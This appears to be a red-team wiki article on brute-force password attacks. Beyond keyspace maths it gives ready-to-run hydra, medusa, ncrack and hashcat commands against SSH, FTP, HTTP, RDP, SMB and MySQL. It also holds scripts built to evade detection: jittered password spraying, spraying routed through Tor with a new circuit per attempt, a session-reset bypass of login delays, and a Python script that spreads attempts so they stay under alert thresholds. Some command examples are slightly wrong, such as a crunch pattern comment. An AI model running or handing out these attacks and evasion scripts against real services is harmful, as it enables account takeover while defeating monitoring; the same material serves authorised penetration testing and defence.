Brute Force

Mathematics of brute force, online vs offline attacks, hydra/medusa workflow, mask attacks, rule-based cracking, and parallelization strategies.

Overview

Brute force is exhaustive guessing. This article separates online attacks against live services from offline attacks against captured hashes, explains why the two have completely different economics, and walks through the keyspace math, tools, and evasion techniques that decide whether an attack is practical.

Required Reading

  • Authentication - credential verification, challenge-response, session management
  • Password Hashing - hash functions, salting, key derivation, work factors

The Mathematics of Brute Force

Brute force is an exhaustive enumeration of a search space. Its feasibility is determined by two numbers: the keyspace (total possible combinations) and the attack rate (guesses per second). The expected time to crack is half the keyspace divided by the attack rate, assuming uniform distribution. 

Keyspace (K) = charset_size ^ password_length
Expected time = (K / 2) / guesses_per_second

Example: 8-character lowercase password
  K = 26⁸ = 208,827,064,576
  Online rate (SSH, 10 guesses/sec):  208B / 2 / 10  = 330 years
  Offline NTLM (modern GPU, 125 GH/s): 208B / 2 / 125B = 0.83 seconds

Conclusion: Online brute force against even moderately complex passwords is
mathematically impossible at realistic rates. Offline brute force against fast
hashes is trivially fast. THIS is why offline hash capture is so critical.

The inflection point is 8 characters. Below 8, exhaustive search is near-instantaneous on fast hashes. Above 12 with full charset, it exceeds practical timeframes.

Online vs Offline Brute Force

The fundamental distinction:

Property Online Brute Force Offline Brute Force
Target Live service Captured hash file
Rate limit Service-enforced (network, server) Hardware-enforced (CPU/GPU)
Typical rate 1-1000/sec 10^6 - 10^12/sec
Detection risk High (logs, IDS triggers) None (local operation)
Lockout risk Present None
Network required Yes No
Tool hydra, medusa, ncrack hashcat, john

Online brute force is a network attack. The server's authentication latency, rate limiting, and connection handling dictate speed. Offline brute force is a compute attack - limited only by your hardware.

Hydra - Online Brute Force

Hydra is the most comprehensive online brute force tool. It compiles with protocol-specific modules that understand the authentication handshake.

Installation

# ArchLinux
sudo pacman -S hydra

# Verify available protocol modules
hydra -h 2>&1 | grep "Supported services" -A 200
# Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp
# ftps http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum
# icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5] mssql mysql nntp
# oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp
# redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum
# snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp

SSH Brute Force

# Single user, wordlist attack
hydra -l root -P passwords.txt ssh://10.0.0.5

# Multiple users, single password (this is spraying, not brute force)
hydra -L users.txt -p 'Summer2026!' ssh://10.0.0.5

# User:password combolist (credential stuffing)
hydra -C combos.txt ssh://10.0.0.5

# Tuning SSH performance:
hydra -l jdoe -P passwords.txt -t 4 -w 10 ssh://10.0.0.5
# -t 4:  4 parallel threads (SSH is latency-bound, >4 rarely helps)
# -w 10: 10-second connection timeout
# -f:    stop after first valid login found
# -V:    verbose (show each attempt)

# Resume a previous session:
hydra -R hydra.restore  # uses the .restore file from previous run

SSH has MaxAuthTries (default 6, hardcoded in most distributions). Hydra opens a new connection for each attempt, so this matters when using password-based auth with multiple attempts per connection. Hydra's default behavior (one attempt per connection) bypasses this entirely.

FTP Brute Force

# FTP is fast — minimal protocol overhead
hydra -l admin -P passwords.txt ftp://10.0.0.5

# FTP with TLS (FTPS)
hydra -l admin -P passwords.txt ftps://10.0.0.5

# FTP with specific port
hydra -l admin -P passwords.txt ftp://10.0.0.5:2121

# High parallelization (FTP handles many concurrent connections well)
hydra -l admin -P passwords.txt -t 16 ftp://10.0.0.5

HTTP POST Form Brute Force

HTTP form brute force requires understanding the login request structure. Hydra sends the body you specify with ^USER^ and ^PASS^ replaced. 

# Step 1: Capture the login request
# Open browser DevTools → Network tab → log in → copy the POST body

# Step 2: Identify failure indicator
curl -X POST http://10.0.0.5/login.php \
  -d 'username=wronguser&password=wrongpass&submit=Login' -s | grep -i "invalid"

# Step 3: Build hydra command
hydra -L users.txt -P passwords.txt 10.0.0.5 http-post-form \
  "/login.php:username=^USER^&password=^PASS^&submit=Login:Invalid username or password"

# The format: "/path:body:failure_string"
#   /path          — URI of the login endpoint
#   body           — POST body with ^USER^ and ^PASS^ placeholders
#   failure_string — string present in response when login FAILS

# Handle CSRF tokens (hydra can parse them from a prior GET request):
hydra -L users.txt -P passwords.txt 10.0.0.5 http-post-form \
  "/login.php:csrf_token=^TOKEN^&username=^USER^&password=^PASS^:Invalid:C=/login.php"
# The trailing ":C=/login.php" tells hydra to first GET that page,
# extract the variable named "csrf_token" (matching the ^TOKEN^ placeholder),
# then use it in the POST body.

HTTP Basic Auth Brute Force

# HTTP Basic auth is just a header: Authorization: Basic base64(user:pass)
hydra -L users.txt -P passwords.txt http-get://10.0.0.5/protected/

# Equivalent with https:
hydra -L users.txt -P passwords.txt https-get://10.0.0.5/protected/

# Basic auth is fast — the server doesn't maintain state between requests
hydra -L users.txt -P passwords.txt -t 64 http-get://10.0.0.5/

RDP Brute Force

# RDP is slow — protocol negotiation, encryption, and channel setup add latency
hydra -l administrator -P passwords.txt rdp://10.0.0.5

# Performance tuning (RDP has inherent overhead, keep threads low)
hydra -l administrator -P passwords.txt -t 1 -w 30 rdp://10.0.0.5
# -t 1:  single thread (RDP connections are heavy)
# -w 30: longer timeout for slow networks

# Better alternative for RDP: crowbar
crowbar -b rdp -s 10.0.0.5/32 -u administrator -C passwords.txt

SMB Brute Force

# SMB protocol (port 445)
hydra -L users.txt -P passwords.txt smb://10.0.0.5

# SMB with specific domain
hydra -l jdoe -P passwords.txt smb://dc01.corp.local -m 'domain=corp'

# SMB requires NetBIOS name resolution on some targets
hydra -L users.txt -P passwords.txt -M 'WORKGROUP' smb://10.0.0.5

MySQL Brute Force

# MySQL native protocol
hydra -l root -P passwords.txt mysql://10.0.0.5

# MySQL with specific database
hydra -l root -P passwords.txt mysql://10.0.0.5 -m 'db=mysql'

# MySQL login is quite fast — few round trips
hydra -l root -P passwords.txt -t 32 mysql://10.0.0.5

Medusa - Multi-Host Brute Force

Medusa's architecture targets multiple hosts simultaneously, making it superior for network-wide password testing. 

# Install
sudo pacman -S medusa

# Single host, single user, wordlist
medusa -h 10.0.0.5 -u jdoe -P passwords.txt -M ssh

# Multiple hosts, multiple users, wordlist
medusa -H hosts.txt -U users.txt -P passwords.txt -M ftp

# Module list
medusa -d 2>&1 | grep "Available modules"
# Available modules: cvs, ftp, http, imap, mssql, mysql, nntp, pcAnywhere,
# pop3, postgres, rexec, rlogin, rsh, smbnt, smtp, snmp, ssh, svn, telnet,
# vmauthd, vnc, web-form, wrapper

# Web form brute force (syntax differs from hydra)
medusa -h 10.0.0.5 -U users.txt -P passwords.txt -M web-form \
  -m FORM:"username=^USER^&password=^PASS^&Login=Login:Incorrect"

# Rate limiting per host
medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh -t 2 -w 5
# -t 2: max 2 parallel connections per target
# -w 5: 5 second delay between attempts

Choosing Hydra or Medusa

Scenario Use Reason
Single host, single protocol hydra Simpler syntax, broader protocol support
Multiple hosts medusa Built-in multi-host parallelization
HTTP forms with CSRF hydra Built-in CSRF token handling
Batch automation hydra -Rresume and-ooutput are more reliable
Speed-critical hydra Generally faster for HTTP/FTP

Ncrack - High-Speed Cracking

Ncrack is built by the Nmap team and focuses on high-performance timing and connection handling.

# Install
sudo pacman -S ncrack

# SSH brute force with connection rate control
ncrack -p ssh --user jdoe -P passwords.txt 10.0.0.5

# RDP with specific timing
ncrack -p rdp --user administrator -P passwords.txt 10.0.0.5

# Control connection rate and parallelism
ncrack -p ssh://10.0.0.0/24:22 --user root -P passwords.txt \
  --connection-limit 10 --rate 5
# --connection-limit: max concurrent connections
# --rate: max new connections per second

# Ncrack's strength is its timing engine — it adjusts to network conditions:
ncrack -p ssh -U users.txt -P passwords.txt 10.0.0.5 \
  -T4 --resume ncrack-session
# -T4: aggressive timing (like Nmap's -T4)

Offline Brute Force - Hashcat

Offline brute force (hash cracking) was partially covered in /wiki/articles/redteam/password-attacks.html . Here we focus on advanced patterns.

Mask Attacks - Known Password Policy

If a password policy is known, the keyspace shrinks dramatically. Policy: "minimum 8 chars, must include uppercase, lowercase, digit" means you can skip all passwords without at least one of each. 

# Generate an exhaustive mask file for a specific policy:
# policy-mask.hcmask — 8 chars, 1 upper, 1 lower, 1 digit, rest any
cat > policy-mask.hcmask << 'EOF'
?u?l?l?l?l?l?l?d
?u?l?l?l?l?l?d?l
?u?l?l?l?l?d?l?l
?u?l?l?l?d?l?l?l
?u?l?l?d?l?l?l?l
?u?l?d?l?l?l?l?l
?u?d?l?l?l?l?l?l
EOF

hashcat -m 0 -a 3 hashes.txt policy-mask.hcmask
# Only tries passwords matching the policy pattern
# Keyspace: ~2.5×10^14 vs full 8-char: 6.6×10^15 (26x smaller)

Rule-Based Attacks

Rules mutate dictionary words before hashing. The OneRuleToRuleThemAll.rule contains 51,811 rules and cracks 69.2% of rockyou passwords on its own test set. 

# Apply a single, specific rule mutation
echo '$l $1' > custom.rule   # lowercase all, append "1"
hashcat -m 0 -a 0 hashes.txt rockyou.txt -r custom.rule

# Common rule syntax:
# :       — pass word through unchanged
# l       — lowercase all
# u       — uppercase all
# c       — capitalize first letter
# C       — lowercase first, uppercase rest
# t       — toggle case of all characters
# TN      — toggle case at position N
# r       — reverse the word
# d       — duplicate the word
# f       — reflect (word + reversed word)
# $X      — append character X
# ^X      — prepend character X
# [        — delete first character
# ]        — delete last character
# D N      — delete character at position N
# p N      — duplicate word N times
# sXY      — replace all X with Y
# @X       — purge all instances of X
# {        — rotate left
# }        — rotate right

# Example: "password" with rule "c $1 $2 $3" → "Password123"
# Example: "password" with rule "sa@ se3 c" → "P@ssw3rd"
# Example: "password" with rule "r" → "drowssap"

Markov Chain Attacks

hashcat's Markov mode ( --markov-* ) uses character transition probabilities learned from a wordlist. Instead of enumerating ?a?a?a?a?a?a?a?a in order, it generates the most probable 8-char strings first: those starting with common first letters and following common digraphs (th, er, on, an). 

# Generate hcstat2 file from a wordlist
# hcstat2gen is built into hashcat-utils
hcstat2gen.bin rockyou.txt -o rockyou.hcstat2

# Use markov-based brute force
hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a?a?a?a \
  --markov-hcstat2=rockyou.hcstat2 \
  --markov-threshold=1000

# statsprocessor — standalone tool for more control
sp64.bin --pw-min=8 --pw-max=8 --threshold=24 -o markov-8.txt rockyou.txt
# Generates 8-char strings ordered by probability
# Threshold: lower = fewer candidates (more selective)

# Pipe statsprocessor output to hashcat for dictionary mode
sp64.bin --pw-min=8 --pw-max=8 rockyou.txt | \
  hashcat -m 0 -a 0 hashes.txt --stdin

Combinator Attack

Company passwords often follow patterns like "Department" + "Year" or "City" + "Season". The combinator attack joins every combination of two (or more) wordlists. 

# Two-word combination
hashcat -a 1 -m 0 hashes.txt departments.txt years.txt

# Three-word combination via piping
hashcat --stdout -a 1 words1.txt words2.txt | \
  hashcat --stdout -a 1 - words3.txt | \
  hashcat -a 0 -m 0 hashes.txt

# Combinator with rules applied post-combination
hashcat -a 1 -m 0 hashes.txt words1.txt words2.txt \
  -j '$d' -k '$d'
# -j: rule applied to left word
# -k: rule applied to right word
# '$d': append a digit to each word before combining

Hybrid Attack

# Mode 6: dict + mask (wordlist with appended mask)
# "password" → "password00", "password01", ... "password99"
hashcat -a 6 -m 0 hashes.txt rockyou.txt ?d?d

# "password" → "password!", "password@", ... "password#"
hashcat -a 6 -m 0 hashes.txt rockyou.txt ?s

# Mode 7: mask + dict (prepended mask)
# "password" → "!password", "@password", ... "#password"
hashcat -a 7 -m 0 hashes.txt ?s rockyou.txt

# Common patterns: word + 4-digit year
hashcat -a 6 -m 0 hashes.txt rockyou.txt ?d?d?d?d

# Word + season
hashcat -a 6 -m 0 hashes.txt rockyou.txt \
  -1 Summer,Winter,Spring,Fall \
  ?1?d?d?d?d

Tool Chaining

Complex password patterns require multiple tools chained together. Understanding piping prevents wasting time on impossible keyspaces. 

# Pipeline: crunch → hashcat
# Generate candidates with crunch, crack with hashcat
crunch 8 8 -t @@@@@@@@ | hashcat -m 1000 -a 0 ntlm-hashes.txt
# crunch generates lowercase-only 8-char passwords
# hashcat hashes each and checks against the target list
# This is CPU-bound by crunch, not GPU-bound — suboptimal

# Better: use hashcat's stdin mode for mask attacks
crunch 8 8 -t @@%@%@%@ | hashcat -m 1000 -a 0 ntlm-hashes.txt --stdin
# crunch pattern: @@%@%@%@ = letter, letter, special, letter, special, letter, special, letter

# Pipeline: John → hashcat
# Generate john candidates, pipe to hashcat
john --stdout --wordlist=rockyou.txt --rules=best64 | \
  hashcat -m 0 -a 0 hashes.txt

# Pipeline: hashcat → hydra
# Generate mask candidates, use as password list for online attack
hashcat --stdout -a 3 ?l?l?l?l?d?d | hydra -l admin -P - ssh://10.0.0.5
# The "-P -" tells hydra to read passwords from stdin

Crunch Wordlist Generation

# Install
sudo pacman -S crunch

# Basic: min 8, max 8, charset "abcd1234"
crunch 8 8 abcd1234 -o passwords-8.txt

# Pattern-based generation
crunch 8 8 -t @@Admin -o passwords.txt
# @ = lowercase letter
# , = uppercase letter
# % = digit
# ^ = special character
# Result: aaAdmin, abAdmin, ..., zzAdmin

# Common patterns:
crunch 8 8 -t ,,,,,@%^ -o seasonal-8.txt
# 3 uppercase, 4 lowercase, 1 digit, 1 special

# With character set files:
crunch 8 8 -p companyname 2024 2025 2026
# Generates permutations of the words: companyname202420252026, 2024companyname20252026, ...
# -p flag: permutations of given words, ignores min/max length

Parallelization Strategies

Splitting Wordlists Across Machines

# Split a wordlist into N equal parts
split -n l/4 rockyou.txt rockyou-part-

# Run on 4 machines simultaneously:
# Machine 1: hashcat -m 1000 -a 0 hashes.txt rockyou-part-aa
# Machine 2: hashcat -m 1000 -a 0 hashes.txt rockyou-part-ab
# Machine 3: hashcat -m 1000 -a 0 hashes.txt rockyou-part-ac
# Machine 4: hashcat -m 1000 -a 0 hashes.txt rockyou-part-ad

# Each machine writes to its own potfile to avoid conflicts
hashcat -m 1000 -a 0 hashes.txt rockyou-part-aa \
  --potfile-path=potfile-machine1.potfile

Splitting Keyspace for Mask Attacks

# hashcat supports keyspace splitting natively:
hashcat -m 0 -a 3 -s 0 -l 100000000000 hashes.txt ?a?a?a?a?a?a?a?a
# -s: skip (start at this keyspace position)
# -l: limit (stop at this keyspace position)

# Distribute across 4 machines:
TOTAL=$(hashcat --keyspace -a 3 ?a?a?a?a?a?a?a?a)  # total keyspace
CHUNK=$((TOTAL / 4))

hashcat -m 0 -a 3 -s 0 -l $CHUNK hashes.txt ?a?a?a?a?a?a?a?a --session=node1 &
hashcat -m 0 -a 3 -s $CHUNK -l $((CHUNK * 2)) hashes.txt ?a?a?a?a?a?a?a?a --session=node2 &
hashcat -m 0 -a 3 -s $((CHUNK * 2)) -l $((CHUNK * 3)) hashes.txt ?a?a?a?a?a?a?a?a --session=node3 &
hashcat -m 0 -a 3 -s $((CHUNK * 3)) -l $TOTAL hashes.txt ?a?a?a?a?a?a?a?a --session=node4 &

# Each session writes its own restore file

Rate Limiting Detection and Evasion

Online brute force detectors monitor for patterns:

  1. High failed login rate (X failures per Y seconds)
  2. Same source IP attempting multiple accounts (spray detection)
  3. Sequential or alphabetical username enumeration
  4. Geographic anomaly (login from unusual location)

Detecting Rate Limits

#!/bin/bash
# rate-limit-probe.sh — Discover rate limiting thresholds
TARGET="http://10.0.0.5/login"

echo "time,http_code,latency_ms" > rate-probe.csv

for i in $(seq 1 50); do
    start=$(date +%s%N)
    code=$(curl -s -o /dev/null -w "%{http_code}" \
        -X POST "${TARGET}" \
        -d "username=testuser&password=wrongpass${i}")
    end=$(date +%s%N)
    latency=$(( (end - start) / 1000000 ))
    echo "$(date +%H:%M:%S),${code},${latency}" >> rate-probe.csv
    sleep 0.2
done

# Analyze: 429 status codes = rate limited
# Increasing latency = server slowing down (soft rate limiting)
# Consistent 200 with "Too many attempts" body = application-level limiting

Jittered Request Timing

# jittered-spray.sh — Randomize timing to evade detection
PASSWORD="Summer2026!"
USERS=$(cat users.txt | shuf)  # randomize order

for user in ${USERS}; do
    echo "[*] ${user}:${PASSWORD}"
    curl -s -X POST http://10.0.0.5/login \
        -d "username=${user}&password=${PASSWORD}" \
        -w "  [%{http_code}]" && echo ""

    # Random sleep between 2000ms and 5000ms
    sleep $(( (RANDOM % 3000) + 2000 ))e-3 2>/dev/null || sleep 3
done

Distributed Brute Force via Tor

#!/bin/bash
# tor-spray.sh — Route each attempt through a new Tor circuit
PASSWORD="Summer2026!"
USERS_FILE="users.txt"

# Ensure Tor is running with ControlPort
sudo systemctl start tor

# Authenticate to Tor control port
authenticate_tor() {
    echo -e "AUTHENTICATE\r\nSIGNAL NEWNYM\r\n" | nc 127.0.0.1 9051
    sleep 5  # wait for new circuit
}

while IFS= read -r user; do
    authenticate_tor
    echo "[*] ${user}:${PASSWORD} via Tor"
    curl -x socks5h://127.0.0.1:9050 \
        -s -X POST http://10.0.0.5/login \
        -d "username=${user}&password=${PASSWORD}" \
        -w "  [%{http_code}]" && echo ""
    sleep 2
done < "${USERS_FILE}"

Service-Specific Considerations

SSH - MaxAuthTries and Connection Limits

# SSH server has MaxAuthTries (per connection) and MaxStartups (concurrent unauthenticated)
# /etc/ssh/sshd_config:
#   MaxAuthTries 6         ← per connection, after 6 failures, connection drops
#   MaxStartups 10:30:100  ← start:drop_at:max unauthenticated connections
#   LoginGraceTime 120     ← seconds to complete authentication

# Impact: hydra opens one connection per attempt (by design).
# MaxAuthTries is irrelevant — each connection tries one password.
# MaxStartups matters — limit -t to stay below the threshold.

# Check SSH server config remotely (banner often reveals version)
nc 10.0.0.5 22 | head -1
# SSH-2.0-OpenSSH_9.3

# For OpenSSH, known limits by version:
# MaxAuthTries 6 is default since OpenSSH 3.9
# Older versions may allow 20+

RDP - NLA and Account Lockout

# Remote Desktop Protocol considerations:
# NLA (Network Level Authentication) — required on modern Windows
# NLA authenticates before establishing the full RDP session
# Without NLA, the RDP login screen appears before auth (less common now)

# RDP lockout: Windows tracks failed RDP logins against the account
# Same lockout threshold applies as console logins

# Verify NLA status:
nmap -p 3389 --script rdp-enum-encryption 10.0.0.5
# If NLA is enabled: "CredSSP (NLA): SUCCESS"
# If NLA is disabled: No CredSSP line

# RDP with restricted admin mode:
# /restrictedAdmin mode uses kerberos, not password
# If enabled, password-based brute force won't work
xfreerdp /v:10.0.0.5 /u:Administrator /p:'password' /restrictedAdmin

HTTP - Application-Level Defenses

# Web apps implement various defenses beyond rate limiting:
# 1. CAPTCHA after N failures
# 2. Progressive delays (2s, 4s, 8s, 16s...)
# 3. Session-based tracking
# 4. Browser fingerprinting (Canvas, WebGL, font enumeration)
# 5. JavaScript challenge (Cloudflare, Akamai)

# Detecting progressive delays:
for i in $(seq 1 10); do
    time curl -s -X POST http://10.0.0.5/login \
        -d "username=admin&password=wrong" > /dev/null
done
# If real times increase: 0.1s, 0.1s, 2.1s, 4.0s, 8.1s...
# The server is implementing progressive delay

# Bypass via session reset:
for i in $(seq 1 10); do
    curl -s -X POST http://10.0.0.5/login \
        -d "username=admin&password=wrong" \
        -c /dev/null  # discard session cookie → new session
done
# If all return in <1s, the delay is session-based

SMB - Domain Account Lockout and NetBIOS

# SMB brute force against Active Directory:
# Every failed authentication increments badPwdCount on the DC
# Lockout is domain-wide — affects all services

# Pre-check: enumerate lockout threshold first
crackmapexec smb 10.0.0.5 --pass-pol

# SMB signing: if required, man-in-the-middle relay attacks won't work
# But direct brute force against the server still functions
nmap -p 445 --script smb2-security-mode 10.0.0.5
# Message signing enabled and required = SMB relay won't work
# Message signing enabled but not required = relay works

# NetBIOS name resolution: hydra needs to resolve the hostname
# If the target requires NetBIOS, use the IP instead
hydra -l Administrator -P passwords.txt smb://10.0.0.5

Login Attempt Distribution Over Time

Effective brute force distributes attempts in a pattern that mimics normal user behavior rather than automated tools. The goal is to stay below detection thresholds. 

#!/usr/bin/env python3
"""time-distributed-bf.py — Distribute brute force attempts realistically"""
import time
import random

def normal_distribution_attempts(total_attempts: int, hours: int) -> list[float]:
    """Generate attempt timestamps following a normal distribution
    around business hours (9 AM - 5 PM), tapering off at night"""
    timestamps = []
    for _ in range(total_attempts):
        # Gaussian: mean 13:00, stddev 4 hours
        hour = random.gauss(13, 4)
        hour = max(0, min(24, hour))  # clamp to 0-24
        # Convert to seconds from now
        offset = random.uniform(0, hours * 3600)
        timestamps.append(offset)
    return sorted(timestamps)

def attempt(target: str, username: str, password: str):
    """Mock attempt — replace with actual curl/hydra call"""
    import subprocess
    result = subprocess.run([
        "curl", "-s", "-X", "POST", target,
        "-d", f"username={username}&password={password}",
        "-w", "%{http_code}"
    ], capture_output=True, text=True)
    return result.stdout.strip()

ATTEMPTS_PER_DAY = 48  # one every 30 minutes during business hours
DAYS = 7

timestamps = normal_distribution_attempts(ATTEMPTS_PER_DAY * DAYS, DAYS * 24)
users = ["admin", "jdoe", "jsmith", "administrator"]
passwords = open("passwords.txt").read().splitlines()

for idx, (user, pw) in enumerate(zip(
    [random.choice(users) for _ in range(len(timestamps))],
    passwords[:len(timestamps)]
)):
    delay = timestamps[idx] - (timestamps[idx - 1] if idx > 0 else 0)
    if delay > 0:
        time.sleep(delay)
    print(f"[{time.strftime('%H:%M:%S')}] {user}:{pw}")

Troubleshooting

  • Hydra reports "all attempts failed" but some should succeed: verify the failure string matches exactly what the server returns. Use -d for debug output to see the actual responses.
  • SSH connections are refused after a few attempts: MaxStartups limits concurrent unauthenticated connections. Reduce -t to stay below the threshold.
  • Hashcat mask attack is too slow: the keyspace may be impossibly large. Calculate it first with hashcat --keyspace -a 3 <mask> . If it exceeds 10^15, the mask is too broad; add constraints.
